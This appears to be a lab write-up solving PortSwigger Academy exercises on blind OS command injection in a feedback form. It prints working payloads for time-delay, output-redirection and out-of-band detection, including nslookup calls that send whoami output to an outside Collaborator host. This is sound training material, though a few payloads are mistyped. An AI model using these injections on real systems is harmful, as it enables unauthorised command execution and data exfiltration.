## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy:

- **Blind OS command injection with time delays**  
  This lab demonstrates how an attacker can use time-based techniques to detect the success of command injection when no output is returned to the browser.

- **Blind OS command injection with output redirection**  
  This lab shows how attackers can redirect command output to a location they can retrieve later, enabling them to exfiltrate data even if no output is returned in the HTTP response.

- **Blind OS command injection with out-of-band interaction**  
  This lab demonstrates how attackers can use out-of-band channels, such as DNS queries, to receive feedback about whether command injection was successful.

- **Blind OS command injection with out-of-band data exfiltration**  
  This lab builds on out-of-band interaction by showing how attackers can exfiltrate actual data through external DNS queries or other protocols.

---

## LAB 2 - Blind OS command injection with time delays

### Lab Description :

![image](https://github.com/user-attachments/assets/e589100b-f230-4011-952e-2c198736b43d)

### Solution :


There is a function to submit feedback:

![image](https://github.com/user-attachments/assets/7fc034c9-cc06-4520-a406-118ee9e4c341)

Identify if one of the following parameters are 
vulnerable to non-Blind Command Injection:
Parameters: name, email, subject, and message

```

|whoami
&whoami

```

-> payloads don’t work in this case.

3. Now, try to test the said parameters in Blind OS Command Injection

```

||ping -c 10 127.0.0.1||

```
Or

The vulnerability affects the fields “Name”, “Email” and “Message”:
```
"; ping -c 127.0.0.1; echo "a

```

![image](https://github.com/user-attachments/assets/0d087714-7c70-4f76-b216-0194745b22c1)

By adding the  ` & sleep # `  (Note the space before & and after #) / ` & sleep 10 & `(URL-encode before sending) , we can see that the `email` parameter is vulnerable to command injection vulnerability, since there was time delay of 10 seconds.

> By '#' we comment out the rest of the query. Since it is a bash script that is running in the background 

REQUEST

![image](https://github.com/user-attachments/assets/d3736dfb-0eb5-4978-9727-b0fccdcbbc33)

RESPONSE 

![image](https://github.com/user-attachments/assets/9801e5c3-c740-48d7-84ff-8e97fd3248f8)

---

## LAB 3 - Blind OS command injection with output redirection

### Lab Description :

![image](https://github.com/user-attachments/assets/5e965cb7-3428-4ab9-ba09-090b6afddffc)


### Solution :

There is a functionality for submitting feedback:

![image](https://github.com/user-attachments/assets/ef578311-8852-4ff5-ab3c-eac37e58c377)

And the images are retrieved with a **GET** request.

![image](https://github.com/user-attachments/assets/fa7a1719-7f14-404e-a9f6-d335f8553c69)



We need to execute:
```
whoami > /var/www/images/whoami.txt
```
I sent the POST request to intruder and set 3 fields to attack in Sniper mode:

![image](https://github.com/user-attachments/assets/6d6bc618-b2a2-4de6-bcc9-7233e7180841)


Then I added 3 payloads:


![image](https://github.com/user-attachments/assets/977fad18-2a1e-48b0-bf4d-64d0116d3f50)


When we add payloads to the field subject the website returns an error:


![image](https://github.com/user-attachments/assets/42742d63-4ad3-45ef-a140-60fc659f3964)


To test output redirection in the email parameter missed during the intruder attack, we inject a command like `whoami > /var/www/images/whoami` via the URL parameter. A 200 OK response when we send request confirms the file was created .

![image](https://github.com/user-attachments/assets/4d94f426-cd04-4d7b-8f93-cdeeb4cff534)



### Access the file

We get the username **“peter-5fYwD0”** after a GET to **"/image?filename=whoami"**, so the above payload has worked:

![image](https://github.com/user-attachments/assets/22b638f2-95ef-4b2e-9642-9d6ff0404e1a)

**Response**

![image](https://github.com/user-attachments/assets/4d5e58b1-9997-4bb1-bca1-d811686faa34)


---

## LAB 4 - Blind OS command injection with out-of-band interaction

### Lab Description :

![image](https://github.com/user-attachments/assets/68386d07-d75c-4e08-b037-b167941dca19)

### Overview

![image](https://github.com/user-attachments/assets/54567258-ba90-432f-be65-3e82aaea1f30)

### Solution :


There is a function to **submit feedback**:

![image](https://github.com/user-attachments/assets/ca57f3ae-ef5b-43fe-9c2c-1d5aa33df58f)

In this case the command injection is achieved with the payload:
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`

![image](https://github.com/user-attachments/assets/eb1639c5-6fb5-48e4-a07b-4a84c3110017)

We get reponse in burp

![image](https://github.com/user-attachments/assets/56fdf55d-7620-42c1-8035-5c0117235a2a)

---

## LAB 5 - Blind OS command injection with out-of-band data exfiltration

### Lab Description :

![image](https://github.com/user-attachments/assets/9f95200c-f64b-4ea3-a8db-70c5f62fb034)

### Solution :

There is a function to submit feedback. It allows out-of-band interaction with the payload:

`$(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)`

We get the username **("peter-0B6BNY")** using the below payload which will execute **whoami** command:

`$(nslookup'whoami'.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)`

![image](https://github.com/user-attachments/assets/82d59ff1-6cb7-45d0-9c80-4929a1f979d2)

We get response on burpsuite.

![image](https://github.com/user-attachments/assets/80344474-d188-460c-b74b-0ce717add519)

